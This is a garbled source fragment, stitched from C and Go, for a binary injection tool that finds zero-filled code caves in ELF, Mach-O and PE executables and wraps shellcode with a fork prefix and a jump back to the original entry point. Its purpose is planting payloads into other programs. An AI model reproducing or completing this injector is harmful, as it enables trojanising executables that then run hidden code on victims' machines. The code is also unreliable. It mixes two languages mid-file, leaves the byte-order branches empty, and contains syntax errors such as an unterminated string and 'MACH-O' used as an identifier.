#DEFINE ELF 1
#DEFINE MACH-O 2
#DEFINE PE 3
#DEFINE BIG_ENDIAN 1
#DEFINE LITTLE_ENDIAN 0
#DEFINE CODE_CAVE 1
#DEFINE SILVIO_METHOD 2
#DEFINE DYNAMIC_METHOD 3
#DEFINE NEW_SECTION 4
int find_code_cave(uint32_t cave_size,uint32_t starting_offset,uint32_t ending_offset,char *buffer)
{
 uint32_t a,b;
  a=starting_offset;
 for(a;a<ending_offset;a++)
  {
   if(buffer[a]==0x00)
  b+=1;
   else
  b=0;
   if(b==cave_size)
  return a;
   }
 return 0;
}
int file_type(char* file)
{
 char buf[4];
 memset(buf,0x00,sizeof(buf));
 FILE *f
  f=fopen(file,"r");
 if(f==NULL)
   return 0;
 else
 {
 fread(buf,sizeof(char),4,f);
 fclose(f);
 if(strcmp(buf,"\x7f\x45\x4c\x46")==0x00)
  return ELF;
 if(strcmp(buf,"\xce\xfa\xed\xfe")==0x00)
  return MACH-O;
 if(strcmp(buf,"\xcf\xfa\xed\xfe")==0x00)
  return MACH-O;
 if(strcmp(buf,"\x4d\x5a\")==0x00)
  return PE; 
  }
           return 0;
}
char *apply_suffix_jmp_intel32(char *shellcode,uint32_t shellcodevaddr,uint32_t entrypoint,int byte_order)
           {
            int i;
            i=strlen(shellcode);
           char *jmp_shellcode=calloc(1,strlen(shellcode)+9); 
            strcat(jmp_shellcode,shellcode);
            if(byte_order)
            {
             
             
             
            }
            else
            {
             
             
             
            }
            jmp_shellcode[i]=0x68;
            jmp_shellcode[i+4]=0xff;
            jmp_shellcode[i+5]=0x24;
            jmp_shellcode[i+6]=0x24;
            return jmp_shellcode;
           }
           func ApplyPrefixForkIntel64(shellcode []byte, entryJump uint32, byteOrder binary.ByteOrder) []byte {
	/*
		Disassembly:
		0:  b8 02 00 00 00          mov    eax,0x2
		5:  cd 80                   int    0x80
		7:  83 f8 00                cmp    eax,0x0
		a:  0f 85 xx xx xx xx       jne    <entryJump>
	*/
	prefix := bytes.NewBuffer([]byte{0xB8, 0x02, 0x00, 0x00, 0x00, 0xCD, 0x80, 0x83, 0xF8,
		0x00, 0x0F, 0x85})
	w := bufio.NewWriter(prefix)
	binary.Write(w, byteOrder, entryJump)
	binary.Write(w, byteOrder, shellcode)
	w.Flush()
	return prefix.Bytes()
}

// ApplySuffixJmpIntel64 - Appends instructions to jump to the original entryPoint (the parameter)
//							Intel x64 Linux version
//
//							Returns the resulting shellcode
func ApplySuffixJmpIntel64(shellcode []byte, shellcodeVaddr uint32, entryPoint uint32, byteOrder binary.ByteOrder) []byte {
	/*
		Disassembly:
		0:  e9 00 00 00 00          jmp    <entryJump>
	*/

	retval := append(shellcode, 0xe9)
	buf := bytes.NewBuffer(retval)
	w := bufio.NewWriter(buf)
	entryJump := entryPoint - (shellcodeVaddr + 5) - uint32(len(shellcode))
	binary.Write(w, byteOrder, entryJump)
	w.Flush()
	return buf.Bytes()
}
int binject(char *file,char *shellcode)
           {
            int type;
            type=file_type(file);
             switch(type)
             { 
              case PE:
               binject_PE(file,shellcode);
              break;
              case MACH-O:
               binject_MACH-O(file,shellcode);
              break;
              case ELF:
               binject_ELF(file,shellcode);
              break;
              default:
               return 0;
              break;
              }
           }
           
